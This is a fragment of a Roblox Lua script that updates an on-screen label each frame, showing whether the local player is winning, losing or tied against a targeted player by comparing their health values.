TextLabel_stat.TextSize = 45.000


game:GetService("RunService").RenderStepped:connect(function()
	if Target == nil then
		TextLabel_stat.Text = "Status: Inactive"
	else

		if game.Players[Target.Name].Character.Humanoid.Health < game.Players.LocalPlayer.Character.Humanoid.Health then
			TextLabel_stat.Text = "Status: Winning"
		else
			TextLabel_stat.Text = "Status: Losing"
		end
		if game.Players[Target.Name].Character.Humanoid.Health == game.Players.LocalPlayer.Character.Humanoid.Health then
			TextLabel_stat.Text = "Status: Tied"
		end
	end	
end)




